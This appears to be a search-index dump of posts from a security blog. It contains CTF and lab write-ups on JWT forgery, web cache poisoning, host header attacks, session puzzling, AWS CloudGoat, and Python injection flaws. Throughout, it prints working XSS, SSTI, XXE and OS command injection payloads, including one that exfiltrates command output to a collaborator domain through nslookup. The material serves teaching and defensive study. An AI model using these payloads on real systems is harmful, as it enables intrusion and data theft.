0.0.0.0:5000 maxconn 32 checkTo bypass the rule, we can use multiple slashes // or /./ to retrieve the ticket.uwsgiFlaskrequestspython_jwt==3.3.3Looking at the requirements.txt file, it is observed that the python_jwt version 3.3.3 used is deprecated and has an associated CVE, the CVE-2022-39227user0x1337/CVE-2022-39227: CVE-2022-39227 : Proof of Concept (github.com)According to this CVE, there is a flaw in the JSON Web Token verification. It is possible with a valid token to re-use its signature with modified claims.We will download the python script and run it with the JWT that we did not obtain from the endpoint /api/v1/get_ticket , and we will change the role from guest to administrator.python3 cve_2022_39227.py -j herecomesyourtoken -i &quot;role=administrator&quot;The return value is a mix form of JSON and compact representation. You need to paste the entire value including “{“ and “}” as your new JWT Web token.Authorization: {&quot; eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAzOTY2NTAsImlhdCI6MTcxMDM5MzA1MCwianRpIjoiS1dIQVhUeWRUWXhJWHdlWjIwMU5VUSIsIm5iZiI6MTcxMDM5MzA1MCwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&quot;, &quot;payload&quot;:&quot;eyJleHAiOjE3MTAzOTY2NTAsImlhdCI6MTcxMDM5MzA1MCwianRpIjoiS1dIQVhUeWRUWXhJWHdlWjIwMU5VUSIsIm5iZiI6MTcxMDM5MzA1MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ&quot;,&quot;signature&quot;:&quot;s-TtAkIi6JBvYqfdx9H8oWF5mA4-tOWPKGfv3rCPlIrA8ncyMgC9Ltobo_gk9GXaj9LmydRKKJPpYuCPsf8IFEmI3ex7LRx6mm84jKhTYQh09_X2U7TToEx-OEFdL7yz0OGKCQOLdBHiEYXVTGWnwIuP8tunOmws2OyVKH3FFI1SgtKAo7RtgwxD6spZBiv3R75B55mp8RDFMzh4luqmXMfV0sSw-mA8zRnr9J2Kb3Cpab88d-3HzQm99wrtwOM-t35ZDUsSFHw4CRyN4XQyuwvHlz2dltUjb8ZnPR7U8naiaSbC0MJIBmPezP26FKGpcpQpBtX5pg01zoKAu7C6OQ&quot;}Then we just have to copy the modified JWT to access the endpoint /api/v1/flag.Get the flag. 🎉" }, { "title": "Web Cache Poisoning Techniques", "url": "/posts/Web-Cache-Poisoning/", "categories": "Web Security, HTB", "tags": "web security, labs, owasp", "date": "2024-02-10 11:00:00 -0500", "snippet": "Web cache PoisoningWeb cache poisoning is not web cache deception, is not response splitting or request smugglingweb cache deception tricking caches into storing sensitive information so the attackers can access to it.web cache poisoning is serve payloads to users via cache responsesCache keys: The unique identifier that the server wont cache (refresh based on that: only host + path)“Everything that is not part of the cache key is part of the cache poisoning attack surface”How To find Web Cache poisoning Identify unkeyed input: http header or cookie Look up if I can done anything interested (use param miner) Specify a random cache buster(a parameter to change its value every request): if I don’t do this, i will receive the cache response and not the unkeyed inputs injected Try to getting save in the cacheCase studies:Trusting headersBased on this no cache header, you may think that is safe, but notUse X-Forwarded-Header to inject an unkeyed inputThe parameter ?safe=1 us used to cache to this specific path and not to the main pageSeizing the CacheIn this Age specifies the exact second that this response will expire to the cache, so in the exact second the cache expires we need to spam the request in order to cache our request.Selective PoisoningThis Vary: User-Agent Header is telling to the cache to add the user agent to the cache key, so this request will poisoning the cache for other people using the same browser.Web cache configurationhttp { proxy_cache_path /cache levels=1:2 keys_zone=STATIC:10m inactive=24h max_size=1g; server { listen 80; location / { proxy_pass http://172.17.0.1:80; proxy_buffering on; proxy_cache STATIC; proxy_cache_valid 2m; proxy_cache_key $scheme$proxy_host$uri$args; add_header X-Cache-Status $upstream_cache_status; } }} proxy_cache_path sets general parameters of the cache like the storage location proxy_pass sets the location of the web server proxy_buffering enables caching proxy_cache sets the name of the cache (as defined in proxy_cache_path) proxy_cache_valid sets the time after which the cache expires proxy_cache_key defines the cache key add_header adds the X-Cache-Status header to responses to indicate whether the response was cachedExample of non-cached and cached requests:Identify Unkeyed ParamsUse this headers to determine if the content served is a cached response or not, check the cache-control response header in the response, how many seconds the response remains refresh:Cache-Control: no-cachePragma: no-cache (deprecated)When we send a different value in language parameter, we can see that the response differs and we get a ceche miss, therebefore the language parameter has to be keyed.Both the language parameter and content are KEYEDThe ref parameter is unkeyed, now we need to find how this parameter influence in the response content (maybe reflected)Payload XSS in Unkeyed Parameter&quot;&amp;gt;&amp;lt;script&amp;gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;/admin.php?reveal_flag=1&#39;,true);xhr.withCredentials=true;xhr.send();&amp;lt;/script&amp;gt;GET /index.php?language=de&amp;amp;ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true);xhr.withCredentials%20=%20true;xhr.send();%3C/script%3E HTTP/1.1Host: webcache.htbPayload XSS in Unkeyed HeadersGET /index.php?language=de HTTP/1.1Host: webcache.htbX-Backend-Server: testserver.htb&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;/admin.php?reveal_flag=1&#39;,true);xhr.withCredentials=true;xhr.send();//ImpactXSSUnkeyed cookiesGET /index.php HTTP/1.1Host: webcache.htbCookie: consent=1;if this response is cached, all other users will that visit the website are server content as if they already consented, also if color=blue cookie is cached, all other uses will still get server the blue layout if they previously choosen another color.DOSGET / HTTP/1.1Host: webcache.htb:80If normalization is applied (stripping the port), this request will translate to thisHTTP/1.1 302 FoundLocation: http://webcache.htb:80/index.phpSo, if we change the host to webcache.htb:1337, all users will be redirected to this port and achieve DOS.Cache BustersIn real cases, we need a unique cache key that we only use, so we get server the poisoned response and no real users are affectedGET /index.php?language=unusedvalue&amp;amp;ref=&quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; HTTP/1.1Host: webcache.htbAdvanced TechniquesFat GetBasically GET request with request body (any method can contain request body but not necessarily effect), but is the server is misconfigured we can pass the keyed parameters in the request to cache the server.This means our first request poisoned the cache with our injected fat GET parameter, but the web cache correctly uses the GET parameter in the URL to determine the cache key.GET /index.php?language=de HTTP/1.1Host: fatget.wcp.htbContent-Length: 142ref=&quot;&amp;gt;&amp;lt;script&amp;gt;var xhr = new XMLHttpRequest();xhr.open(&#39;GET&#39;, &#39;/admin.php?reveal_flag=1&#39;, true);xhr.withCredentials = true;xhr.send();&amp;lt;/script&amp;gt;Parameter CloakingPayload with all ; URL encoded:ref=a%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest()%3Bxhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true)%3Bxhr.withCredentials%20=%20true%3Bxhr.send()%3B%3C/script%3EThe web cache sees two GET parameters: language with the value en and a with the value b;language=de. On the other hand, Bottle sees three parameters: language with the value en, a with the value b, and language with the value de. Since Bottle prefers the last occurrence of each parameter, the value de overrides the value for the language parameter. Thus, Bottle serves the response containing the German text. Since the parameter a is unkeyed, the web cache stores this response for the cache key language=en.GET /?language=en&amp;amp;a=b;language=de HTTP/1.1Host: cloak.wcp.htbsent multiple parameters with ; (separator)a, b are unkeyed parameter (we need to use unkeyed to append keyed (language))language, content and ref are keyedGET /?language=de&amp;amp;a=b;ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest()%3bxhr.open(%27GET%27,%20%27/admin?reveal_flag=1%27,%20true)%3bxhr.withCredentials%20=%20true%3bxhr.send()%3b%3C/script%3E HTTP/1.1Host: cloak.wcp.htbExercise Web Cache 1 (GET FAT)Parameter content and language are keyed This is a get fat exercise, so i need to send language parameter in the GET request body.Since in the hint says the admin will accesses the URL /index.php?language=de, I need to only key this argument like this.!Flag delivered: HTB{6f4c51837d8148cb8dc66beb14003706} Exercise Web Cache 2(Parameter Cloaking )This is the original request, the hint says the admin will visit /?language=de, so we need to poison this parameter appending a=b;language=payload.Payload:?language=de&amp;amp;a=b;language=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest()%3bxhr.open(%27GET%27,%20%27/admin?reveal_flag=1%27,%20true)%3bxhr.withCredentials%20=%20true%3bxhr.send()%3b%3C/script%3EWe see the payload reflected in the response (stored xss), so the server cached the response and a request to /?language=de will serve the payload to admin.Flag delivered!: HTB{cac766b823bbd388727162d634fa7503}Host Header AttacksCommon web server configuration:&amp;lt;VirtualHost *:80&amp;gt; DocumentRoot &quot;/var/www/testapp&quot; ServerName testapp.htb&amp;lt;/VirtualHost&amp;gt;&amp;lt;VirtualHost *:80&amp;gt; DocumentRoot &quot;/var/www/anotherdomain&quot; ServerName anotherdomain.org&amp;lt;/VirtualHost&amp;gt;Override HeadersX-Forwarded-HostX-HTTP-Host-OverrideForwardedX-HostX-Forwarded-Serverx-http-method-override: POST (overrides the method, check purge or head)content-type: s4yhii (test for invalid header make unavailable a web or repo)x-forwarded-scheme: http (make a content unavailable, combine with x-forwarded-host)Auth bypass via host header Change Host header to localhost to access admin areas Fuzz for different ipv4 ips. for a in {1..255};do for b in {1..255};do echo &quot;192.168.$a.$b&quot; &amp;gt;&amp;gt; ips.txt donedone ffuf -u http://IP:PORT/admin.php -w ips.txt -H &#39;Host: FUZZ&#39; -fs 752ExercisePassword Reset PoisoningSend a request with the email of the victim and a manipulated host header that points to a domain under our control.The webapp uses the manipulated host header to construct the password reset link such that the link points to our domain. When the victim now clicks the password reset link, we will be able to see the request on our domain.ExerciseSending http request with an override host header like X-Forwarded-Host pointing to our controlled server and the email of the victim (admin account)Use this url to change the admin password.Web cache poisoningIf you have web cache poison in a login.php endpoint, you can use override headers to point to a server u own and exfiltrate the creds, use GET parameter to posing the cache.ExerciceFirst we enter a cache buster to test this attack, to send to the admin we will erase this cache buster, and we add X-Host header to override the host header in the response, this can lead to posing the action form and send the creds with usThe admin accesses the URL http://admin.hostheaders.htb/login.phpFinal POC Request to steal admin credsExercice Bypass flawed validationBypassing blacklist filters for localhost: Decimal encoding: 2130706433 Hex encoding: 0x7f000001 Octal encoding: 0177.0000.0000.0001 Zero: 0 Short form: 127.1 IPv6: ::1 External domain that resolves to localhost: localtest.meSession PuzzlingStateful: Set-Cookie: PHPSESSID=hvplcmsh88ja77r3dutanmn68u;Stateless: Set-Cookie: auth_token=eyfefefJ…….&amp;lt;?phprequire_once (&#39;db.php&#39;);session_start();// loginif(check_password($_POST[&#39;username&#39;], $_POST[&#39;password&#39;])) { $_SESSION[&#39;user_id&#39;] = get_user_id($username); header(&quot;Location: profile.php&quot;); die();} else { echo &quot;Unauthorized&quot;;}// logoutif(isset($_POST[&#39;logout&#39;])) { $_SESSION[&#39;user_id&#39;] = 0;}?&amp;gt;user_id is set to zero when logging out, so if zero is a valid user id, for instance for the admin user, the user could access /profile.php and find that he is logged as admin user.Weak session IDs#create wordlist with 4 characterscrunch 4 4 &quot;abcdefghijklmnopqrstuvwxyz1234567890&quot; -o wordlist.txt#fuzz for weak session idsffuf -u http://127.0.0.1/profile.php -b &#39;sessionID=FUZZ&#39; -w wordlist.txt -fc 302 -t 10To analyze the entropy of session IDs, we can use Burp Sequencer. To do so, we right-click the login request in Burp and click on Send to Sequencer. Afterward, switch to the Sequencer Tab. Make sure that Burp automatically detected the session cookie in the Token Location Within Response field and that the Cookie option is selected. We could also specify a custom location if we wanted to analyze the entropy of a different field in the response. Afterward, start the live capture.Common Session Variables (Auth Bypass)1ST takeaway: In multi step reset password flow, if the flow has 3 steps, omit the second step, usually verification (2fa, sms, etc) and reset the pass with the third step.2ND takeaway:  enter Forgot Password? and enter the username admin. Afterward, access the post-login endpoint at /profile.php directly. We are now logged in as the admin user by exploiting our first session puzzling vulnerability. This happens because of this code&amp;lt;SNIP&amp;gt;if(isset($_POST[&#39;Submit&#39;])){ $_SESSION[&#39;Username&#39;] = $_POST[&#39;Username&#39;]; header(&quot;Location: reset_2.php&quot;); exit;}&amp;lt;SNIP&amp;gt;&amp;lt;SNIP&amp;gt;if(!isset($_SESSION[&#39;Username&#39;])){ header(&quot;Location: login.php&quot;); exit; }&amp;lt;SNIP&amp;gt;See that the session variable username is set by forgot password flow and the auth code only checks if the variable is set.ExerciseSend a request with admin user in forgot password, remember the cookiethe user is set to admin in this session cookie, so we only need to visit profile.php with this cookie without authentication.Premature Session Population (Auth Bypass)The login process sets the session variables that determine whether a user is authenticated or not before the result of the authentication is known, which is before the user’s password is checked. The variables are only unset if the redirect to /login.php?failed=1 is sentif(isset($_POST[&#39;Submit&#39;])){ $_SESSION[&#39;Username&#39;] = $_POST[&#39;Username&#39;]; $_SESSION[&#39;Active&#39;] = true; // check user credentials if(login($Username, $_POST[&#39;Password&#39;])) { header(&quot;Location: profile.php&quot;); exit; } else { header(&quot;Location: login.php?failed=1&quot;); exit; }}if (isset($_GET[&#39;failed&#39;])) { session_destroy(); session_start();}ExerciseChange failed= 1 with success=1Common Session Variables (Account Takeover)This session puzzling vulnerability is the result of the re-use of the same session variable to store the phase of two different processes. If these processes are executed concurrently, it is possible to skip the security question of the password reset process, thus leading to account takeover.Exercise:primero ir a register colocar admin en register_1, luego ir a reset_1 colocar admin, seguir con register_2 y aceptar. Saltar a reset_3 y configurar la nueva password. Al ingresar piden MFA, por ello volveremos a register_1 para hacer register_1 y register_2, finalmente volveremos al MFA y entraremos a profile.php.PreventionNever set sessionid by default to 0, when log out for example.// loginif(check_password($_POST[&#39;username&#39;], $_POST[&#39;password&#39;])) { $_SESSION[&#39;user_id&#39;] = get_user_id($username); header(&quot;Location: profile.php&quot;); die();} else { echo &quot;Unauthorized&quot;;}// logoutif(isset($_POST[&#39;logout&#39;])) { $_SESSION[&#39;user_id&#39;] = 0;}Common Session Variablesnever re-use session variables for different processes on the web application since it can be hard to keep track of how the different processes intertwine and may be combined to bypass certain checks. Additionally, a separate session variable should be used to keep track of whether a user is currently logged in. Following is a simple improved example:if(isset($_POST[&#39;Submit&#39;])){ if(login($_POST[&#39;Username&#39;], $_POST[&#39;Password&#39;])) { $_SESSION[&#39;auth_username&#39;] = $_POST[&#39;Username&#39;]; $_SESSION[&#39;is_logged_in&#39;] = true; header(&quot;Location: profile.php&quot;); exit; } else { &amp;lt;SNIP&amp;gt; }}Premature population Due to the premature population of the session variables, the user is thus considered logged in by the web server before the password is checked. This can easily be prevented by ensuring that the session variables are not populated prematurely, but only after the login process has been completed: ```phpif(isset($_POST[‘Submit’])){ $_SESSION[‘login_fail_user’] = $_POST[‘Username’];if(login($_POST[&#39;Username&#39;], $_POST[&#39;Password&#39;])) { $_SESSION[&#39;auth_username&#39;] = $_POST[&#39;Username&#39;]; $_SESSION[&#39;is_logged_in&#39;] = true; header(&quot;Location: profile.php&quot;); exit;} else { header(&quot;Location: login.php?failed=1&quot;); exit;} } if (isset($_GET[&#39;failed&#39;])) {echo &quot;Login failed for user &quot; . $_SESSION[&#39;login_fail_user&#39;];session_start();session_unset()session_destroy(); } ``` - Completely unset session variables instead of setting a default value at re-initialization - Use a single session variable only for a single, dedicated purpose - Only populate a session variable if all prerequisites are fulfilled and the corresponding process is completeSkill AssessmentEasyLogin with you normal credsYou cant access admin areaIn order to populate the username variable we use reset password functionAfter clic in submit the flag appearsHardAfter loggin with normal creds we see this messageso we now have a clue where to poison the cache, we see the parameters sort_by and utm_source, sort_by is unkeyed, so we use this via parameter cloacking to poison the cache, also we verifiy where is injected our payload to make the correct one/admin/users.html?sort_by=role&amp;amp;utm_source=users.html;sort_by=&quot;)&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;var+xhr+%3d+new+XMLHttpRequest()%3bxhr.open(&#39;GET&#39;,+&#39;/admin/promote%3fuid%3d2&#39;,+true),xhr.send()%3b&amp;lt;/script&amp;gt;Then for the other part, we need to exfiltrate the pin, we found the Forwarded Header is unkeyed and is reflected in response so we use this header to inject our interactsh.local url without the cache buster a=xd.and refresh=1Get the flag. 🎉 Thanks for read, Happy hacking and always try harder!" }, { "title": "Cloudgoat rce_web_app scenario", "url": "/posts/AWS-Cloudgoat-Lab/", "categories": "Web Security, AWS", "tags": "web security, labs, owasp, rce, cloud, aws", "date": "2023-01-10 11:00:00 -0500", "snippet": "Cloudgoat RCE_WEB_APP ScenarioIntroductionCloudGoat is a training and learning platform developed by Rhino Security Labs to help individuals and organizations understand the risks and vulnerabilities associated with cloud-based applications. One of the scenarios available on CloudGoat is the RCE_web_app scenario, which allows users to practice exploiting remote code execution vulnerabilities in a web application running on the cloud.In this blog post, we will walk through the RCE_web_app scenario in CloudGoat and provide a step-by-step guide on how to exploit the vulnerability and gain access to the application’s backend. We will also discuss the significance of this vulnerability and how it can be prevented in real-world scenarios. By the end of this post, you should have a better understanding of the risks and challenges associated with web application security in the cloud and how to mitigate them. So, let’s get started!Solution 1When deploying the laboratory we have access to 2 users: Lara and MCduck, first we will start listing the services with the user Lara.aws configure --profile LaraFinding EC2 InstancesWe decided to start by finding out which EC2 instances Lara has access to by running the following command.aws ec2 describe-instances --profile LaraThe output shows that Lara has access to an EC2 instance with a public IP. However, when we try to navigate to the IP in a browser, we get a timeout, so I decided to look at load balancers with this commandFinding Elastic Load Balancersaws elbv2 describe-load-balancers --profile LaraWe see a publicly accessible load balancer, we have the public DNS name, so we access it from browser and we see a landing page with nothing interesting, so if it exists a webpage, it needs a bucket to stores all the static files.Finding S3 Bucketsaws s3 ls --profile LaraThe output of this command shows us that Lara can list 3 buckets, as pictured below.Then we need to list the content of buckets with this command:aws s3 ls s3://&amp;lt;bucket&amp;gt; --recursive --profile LaraThis bucket appears to contain logs for the load balancer we discovered earlier, so we download the content with this command.aws s3 cp s3://cg-logs-s3-bucket-rce-web-app-cgidtjk4gmqpko/cg-lb-logs/AWSLogs/261824994497/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile LaraWe see an URL in the log files, after accessing to the URL we got a timeout, this path ‘mkja1xijqf0abo1h9glg.html’ keeps repeating in all log urls, so maybe we need a valid url to access it, so we append the path to the previous URL we’ve found and we got a page to run commands.Getting Access via SSHFrom the EC2 enumeration we know that the instance has ssh enabled, but EC2 instances uses keys not credentials." }, { "title": "Vulnerabilities in Python Code", "url": "/posts/Injections-in-Python/", "categories": "Web Security, Secure Coding", "tags": "web security, coding, python", "date": "2022-07-05 11:00:00 -0500", "snippet": "OS Command InjectionVulnerable ExampleThe following snippet contains a Flask web application written in Python that executes the nslookup command to resolve the host supplied by the user.@app.route(&quot;/dns&quot;)def page(): hostname = request.values.get(hostname) cmd = &#39;nslookup &#39; + hostname return subprocess.check_output(cmd, shell=True)We can see the hostname appended to the command and executed on a subshell with the paratmeter shell=true, an attacker could stack another command with ; in the GET parameter to inject other commands for example cat /etc/paswd .PreventionThe recommended approach to execute commands is using the subprocess API, with the option shell set to False.Safe examplecmd= [&#39;ping&#39;, &#39;-c&#39;, &#39;3&#39;, address]p=Popen(cmd, shell=False, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)@app.route(“/dns”)def page():hostname = request.values.get(hostname)cmd = &#39;nslookup &#39; + hostnamereturn subprocess.check_output(cmd, shell=True) ``` ``` # Server Site Template Injection (STTI)Vulnerable ExampleThis snippet contains a Flask webapp written in Python, which concatenates user input data with a template string.@app.route(&quot;/page&quot;)def page(): name = request.values.get(&#39;name&#39;) output = Jinja2.from_string(&#39;Hello &#39; + name + &#39;!&#39;).render() return outputThe user input data is concatenated to the template text, allowing an attacker to inject template code, for example {{5*5}} will be rendered as 25.$ curl -g &#39;http://localhost:5000/page?name={{7*7}}&#39;Hello 49!Depending on the template engine, advanced payloads can be used to escape the template sandbox and gain RCE in the system, for example this snippet run a system command that add a malicious script in the tmp folder.$ curl -g &#39;http://localhost:5000/page?name={{&#39;&#39;.__class__.mro()[1].__subclasses__()[46](&quot;touch /tmp/malicious.sh&quot;,shell=True)}}&#39;Prevention#Jinja2import Jinja2Jinja2.from_string(&quot;Hello {{name}}!&quot;).render(name=name)Safe exampledef page_not_found(e): return render_template_string( &#39;404 page not found error: the resource does not exist.&#39;, path=request.path), 404Reflected Cross-Site Scripting in MOTDPreventionInput Validation Exact Match: Only accept values from a finite list of known values. Allow list: If a list of all the possible values can’t be created, accept only known good data and reject all unexpected input. Deny list: If an allow-list approach is not feasible (on free form text areas, for example), reject all known bad values.Content Security Policy (CSP)Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross-Site Scripting (XSS) and data injection attacks. CSP via a special HTTP header instructs the browser to only execute or render resources from those sources.For example:Content-Security-Policy: default-src: &#39;self&#39;; script-src: &#39;self&#39; static.domain.tldThe above CSP will instruct the web browser to load all resources only from the page’s origin and JavaScript source code files from static.domain.tld. For more details on Content Security Policy, including what it does and how to use it, see this article.notice how the motd variable is inserted into the HTML page using the safe Jinja filter, which disables HTML escaping of the content and introduces a reflected XSS vulnerability.#In vanilla Python, this can be escaped by this html methodhtml.escape(&#39;USER-CONTROLLED-DATA&#39;)# In jinja everything is escaped by default except for values with |safe tag&amp;lt;li&amp;gt;&amp;lt;a href=&quot; \\{{ url }}&quot;&amp;gt;{{ text }}&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;Safe example: &amp;lt;h2&amp;gt; welcome {{ username }}.&amp;lt;/h2&amp;gt; !{% if motd %} &amp;lt;p&amp;gt;{{motd|e}}&amp;lt;/p&amp;gt; {% endif %}SQL InjectionVulnerable ExampleThis Flask applicatin checks the user creentials against the SQL database.@app.route(&quot;/login&quot;)def login(): username = request.values.get(&#39;username&#39;) password = request.values.get(&#39;password&#39;) # Prepare database connection db = pymysql.connect(&quot;localhost&quot;) cursor = db.cursor() # Execute the vulnerable SQL query concatenating user-provided input. cursor.execute(&quot;SELECT * FROM users WHERE username = &#39;%s&#39; AND password = &#39;%s&#39;&quot; % (username, password)) # If the query returns any matching record, consider the current user logged in. record = cursor.fetchone() if record: session[&#39;logged_user&#39;] = username # disconnect from server db.close()This concatenates username and password, so an attacker could manipulate this to bypass the login mechanism.Injecting &#39; OR &#39;1&#39;=&#39;1&#39;;-- in the username, the query becomes:SELECT * FROM users WHERE username = &#39;&#39; OR &#39;a&#39;=&#39;a&#39;;-- AND password = &#39;&#39;;So this query return any entry in the users table thas has an empty username, so the attacker can log in as the first user in the table.Prevention Scrutinize all the SQL queries that use user-provided input from the HTTP request, such as from sources like request.args.get, request.args.args, and request.args.forms User parameterized queries, specifying placeholders for parameters Escape inputs before adding them to the query, query concatenation should be avoidedSome python libraries provides the function to use parameterized queries on all type of databases.PyMySQL, MySQL-pythoncursor.execute(&quot;SELECT * FROM users WHERE username = %s AND password = %s&quot;, (username, password))Safe example sql_statement = &quot;SELECT username FROM users WHERE username=&#39;%s&#39; and password_hash=&#39;%s&#39;&quot;, (username, password_hash, )XML Entity Expansion (XXE)Vulnerable ExampleThis flask snippet pases XML and returns the parsed content in html@tools.route(&quot;/is_xml&quot;, methods=[&#39;POST&#39;])def tools_is_xml(): try: # read data from POST xml_raw = request.files[&#39;xml&#39;].read() # create the XML parser parser = etree.XMLParser() # parse the XML data root = etree.fromstring(xml_raw, parser) # return a string representation xml = etree.tostring(root, pretty_print=True, encoding=&#39;unicode&#39;) return jsonify({&#39;status&#39;: &#39;yes&#39;, &#39;data&#39;: xml}) except Exception as e: return jsonify({&#39;status&#39;: &#39;no&#39;, &#39;message&#39;: str(e)})When the etree.fromstring method is called, it parses and expands with the external entity.&amp;lt;!DOCTYPE d [&amp;lt;!ENTITY e SYSTEM &quot;file:///etc/passwd&quot;&amp;gt;]&amp;gt;&amp;lt;t&amp;gt;&amp;amp;e;&amp;lt;/t&amp;gt;In this example the entity &amp;amp;e; is expanded with the content of /etc/passwd file.PreventionThe safest way to prevent XXE is always to disable DTDs (External Entities) completely.Depending on the parser, the method should be similar to the following:parser = etree.XMLParser(resolve_entities=False, no_network=True) Disabling DTDs (Document Type Definitions) also makes the parser secure against denial of services (DOS) attacks such as Billion Laughs.If external entities are necessary then: Use XML processor features, if available, to authorize only required protocols (eg: https). Use an entity resolver (and optionally an XML Catalog) to resolve only trusted entities.Safe example # create the XML parser parser = etree.XMLParser(resolve_entities=False, no_network=True) # parse the XML data root = etree.fromstring(xml_raw, parser)" }, { "title": "HackTheBox Web Challenges", "url": "/posts/Web-Challenges-HTB/", "categories": "Web Security, HTB", "tags": "web security, labs, owasp, writeup, challenge, web", "date": "2022-07-01 11:00:00 -0500", "snippet": "Templated Dificulty: easy Description: Can you exploit this simple mistake?SolutionFirst we visit the site and see that uses jinja2, this template is susceptible to SSTI attacks.We see that the directory searched is rendered in the page with 25, so its vulnerable to SSTI.We use the payload that will allow us to RCE on the server to read the file flag.txt, we extract it from PayloadsAllTheThings.# in curly bracketsself._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#39;cat flag.txt&#39;).read()Then we get the flag rendered.Phonebook Dificulty: easy Description: Who is lucky enough to be included in the phonebook?Solutionwhen we enter to the web we see a login screen and a warning, there we discover the user reese, but we lack the password, in this case after trying brute force in the password field, the payload ‘*’ allowed me to bypass the login, then it is deduced that it uses wildcards and the flag is the password of reese, since it begins with HTB{*.We created a python script to brute force the pass with the help of the string and request library, I leave the script here for you to try it.import requestsimport stringdef obtain_flag(url, flag): creds = {&#39;username&#39;:&#39;reese&#39;, &#39;password&#39;: flag} r=requests.post(url,data=creds) if &#39;success&#39; in r.text: return True else: return False if __name__==&quot;__main__&quot;: letters = list(string.ascii_letters) begin=&#39;HTB{&#39; payload= letters + list(string.digits) + [&#39;,&#39;,&#39;_&#39;,&#39;-&#39;,&#39;}&#39;] flag=&#39;&#39; url= &quot;http://206.189.26.97:30301/login&quot; while True: for i in payload: flag=begin+i+&#39;*&#39; if obtain_flag(url,flag): begin=begin+i print(begin) else: print(begin)After executing the script we wait for it to decrypt the password and we get the flag.Lovetok Dificulty: easy Description: True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung…" }, { "title": "Os Command Injection Labs", "url": "/posts/OS-Command-Injection-Labs/", "categories": "Web Security, Portswigger Academy", "tags": "web security, labs, owasp, injection", "date": "2022-06-10 11:00:00 -0500", "snippet": "OS command injection allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.OS command injection, simple caseThis lab contains an OS command injection vulnerability in the product stock checker.The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.To solve the lab, execute the whoami command to determine the name of the current user.Solution:We intercept the option check stock with Burpsuite to see what parameters are being sent by the function. We see that it is passing the productID and storeID parameters, we will use ; to add the whoami command at the system level, we can also use to add another command to the function. We see that it returns the user peter, and the error is due to the fact that whoami is accompanied by another parameter which is the storeID, but we can see the execution of the command in the output.Blind OS command injection with time delaysThis lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.Solution:Since we know that the vulnerability is present, we must intercept the feedback request.We see the entered fields, now we will try in each field the following payload which was url encoded followed and before a semicolon so that the system executes it since it is blind.%3bping+-c+10+127.0.0.1%3bI tried each field and the one I got a response 10 seconds later was the email field.Blind OS command injection with output redirectionThis lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:/var/www/images/Solution:Since we know the writable folder, we will intercept the request after sending a feedback and append the command whoami. then redirect the output to a file in the images directory.%3bwhoami+&amp;gt;+/var/www/images/whoami.txt%3bUsing this payload in the name field, we can exploit this vulnerability and retrieve the identity if the machine.We retrieve the user peter-5ecF3J accessing to the file whoami.txt created before.Blind OS command injection with out-of-band interactionThis lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application’s response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.Solution:The same approach as others, we intercept the request and append the payload %3bnslookup+kh517r226djh7tygiznk82rw6nce03.burpcollaborator.net%3b next to the mail field and in the burp collaborator windows wait for the response.We received the response, so we have out-of-band command injection.Blind OS command injection with out-of-band data exfiltrationThis lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application’s response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.Solution:Modify the email parameter, changing it to something like the following payload: %3bnslookup+&#39;whoami&#39;zil3gb1836jd20t5u772s4e7pyvojd.burpcollaborator.net%3b this will exfiltrate the command output data to the burp collaborator client.We receive the output of the command and retrieve the user peter-wGfYie.How to prevent OS command injection attacksBy far the most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In virtually every case, there are alternate ways of implementing the required functionality using safer platform APIs.If it is considered unavoidable to call out to OS commands with user-supplied input, then strong input validation must be performed. Some examples of effective validation include: Validating against a whitelist of permitted values. Validating that the input is a number. Validating that the input contains only alphanumeric characters, no other syntax or whitespace.Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker." }, { "title": "Cyber Apocalypse 2023 2x Web Challenges Writeup", "url": "/posts/HTB-Cyber-Apocalypse-CTF-Web-Writeups/", "categories": "HTB Writeups, Cyber Apocalypse CTF", "tags": "web security, ctf, owasp", "date": "2022-05-18 11:00:00 -0500", "snippet": "Kryptos SupportChecking the web page of this challenge gives a form to send an issue and an admin will review that issue.So its interesting, maybe the admin will click in that issue and we can inject some kind of payload, like an stored 